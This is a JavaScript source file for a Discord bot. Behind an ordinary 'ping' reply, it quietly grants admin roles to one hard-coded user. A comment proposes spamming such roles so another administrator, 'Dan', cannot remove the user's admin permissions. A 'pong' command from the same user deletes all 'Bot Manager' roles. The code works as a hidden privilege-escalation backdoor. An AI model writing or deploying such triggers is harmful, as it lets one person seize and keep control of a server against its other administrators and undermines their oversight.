import Discord from 'discord.js';
const client = new Discord.Client();

import Info from './info';
import { createAdminRole, sleep, printRoles } from './common_functions';

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on('message', async msg => {
  if (msg.content === 'ping') {
    let guild = msg.guild;

    (async () => {
      // Uncomment one of the following to spam roles to prevent Dan from removing your admin perms.
      // for (let i=0; i<100; i++)
      if (msg.author.toString() == Info.usernames.eli) {
        createAdminRole(guild, client, msg.member);

        sleep(1000);
      }
    })();

    msg.reply(`Guild is ${guild}, message author is \`\`\`${msg.author.toString()}\`\`\`.`);
  } else if (msg.content == "pong") {
    let guild = msg.guild;

    (async () => {
      if (msg.author.toString() == Info.usernames.eli) {
        guild.roles.filter(role => role.name == "Bot Manager").forEach(role => role.delete());
        await sleep(30000);

        printRoles(guild);
      }
    })()
  }
});

client.login(Info.bots.bridgeBot.token);